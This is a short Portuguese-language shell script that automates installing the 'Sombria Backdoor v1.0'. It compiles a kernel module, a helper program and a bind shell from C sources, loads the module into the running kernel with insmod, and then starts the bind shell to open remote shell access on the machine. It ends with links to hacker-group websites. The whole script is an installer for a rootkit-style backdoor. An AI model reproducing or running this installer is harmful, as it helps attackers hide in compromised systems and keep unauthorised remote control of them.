#!/bin/sh
#Simples automatizador de processos.
#Desenvolvido para Backdoor Sombria.
#Desenvolvido por Nash Leon.
#nashleon@yahoo.com.br
clear
echo "***************** NL - SOMBRIA BACKDOOR v1.0 *****************"
echo "Compilando Arquivos...."
/usr/bin/gcc -c -O3 NL_sombria_lkm.c
/usr/bin/gcc -o NL_sombria NL_sombria.c
/usr/bin/gcc -o NL_bindshell NL_bindshell.c
echo "Executaveis Criados com Sucesso!!!"
sleep 1
echo "Carregando LKM no Sistema...."
/sbin/insmod NL_sombria_lkm.o
echo "LKM Carregado com Sucesso!!!"
sleep 1
echo "Executando Bind-Shell..."
./NL_bindshell
echo "Shell Bindada com Sucesso!!!"
echo 
echo "Visite:"
echo "http://unsekurity.virtualave.net/"
echo "http://unsekurity.cyberpunk.com.br/"
#EOF

